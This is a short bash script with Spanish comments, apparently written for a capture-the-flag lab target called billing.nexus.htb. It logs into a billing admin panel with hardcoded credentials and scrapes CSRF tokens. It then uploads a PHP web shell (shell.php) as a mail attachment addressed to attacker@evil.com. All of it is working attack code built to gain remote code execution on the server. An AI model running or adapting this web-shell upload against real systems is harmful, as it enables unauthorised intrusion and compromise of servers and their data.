#!/bin/bash
IP="10.129.107.139"; H="Host: billing.nexus.htb"; JAR=/tmp/opencode/fresh.txt; rm -f $JAR

# 1) Login completo
TOKEN=$(curl -s -H "$H" -c $JAR http://billing.nexus.htb/admin/login | grep -oP 'name="_token" value="\K[^"]+' | head -1)
curl -s -H "$H" -b $JAR -c $JAR -d "_token=$TOKEN&email=j.matthew@nexus.htb&password=N27xh!!2ucY04" \
  http://billing.nexus.htb/admin/login -o /dev/null

# 2) Token fresco desde draft
T2=$(curl -s -H "$H" -b $JAR -c $JAR http://billing.nexus.htb/admin/mail/draft | grep -oP 'name="_token" value="\K[^"]+' | head -1)

# 3) Upload inmediato del shell
echo "[*] Subiendo shell.php como adjunto..."
curl -s -H "$H" -b $JAR --max-time 25 -o /tmp/opencode/up.json -w "HTTP:%{http_code}\n" \
  -F "_token=$T2" -F "to=attacker@evil.com" -F "subject=t" -F "reply=<p>t</p>" \
  -F "attachments[]=@/tmp/opencode/shell.php;type=application/x-php" \
  http://billing.nexus.htb/admin/mail/create
head -c 400 /tmp/opencode/up.json; echo
